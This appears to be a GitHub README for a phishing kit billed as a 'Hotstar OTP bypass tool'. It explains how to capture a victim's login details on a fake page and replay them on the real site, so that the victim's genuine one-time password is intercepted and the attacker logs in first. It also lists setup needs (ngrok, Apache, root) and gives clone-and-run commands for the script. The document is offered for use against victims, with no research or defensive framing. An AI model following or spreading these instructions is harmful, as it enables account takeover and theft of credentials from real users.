# HOTSTAR OTP BYPASS TOOL
 with the help of this tool you can bypass TFO security ! HOSTART
![5e2aa0cb47a6a274285d2225_hotstar-2](https://user-images.githubusercontent.com/55870659/76422457-9cbd4b80-637b-11ea-8eb7-9dc3cd799d99.png)

# OTP Bypass Instructions
When victim enter his credentials, you need to go to original website and use those credentials to send real OTP to victim. Once he enter that OTP such OTP will also be there with you and you will be allowed to login the account before him.

![ho](https://user-images.githubusercontent.com/55870659/76422984-7ea41b00-637c-11ea-8c30-5c01121df4e0.png)


# Requirements
1. ngrok setup
2. Root - Must
3. Apache Server
4. Internet
5. add repo on kali

# How to Intsall & Use
root ---must !
1. git clone https://github.com/Ignitetch/Hotstar-otp-bypass.git
2. cd Hotstar-otp-bypass/
3. chmod 777 *
4. ./Hotstar.sh

# Contact For Contribute
sg5479845@gmail.com
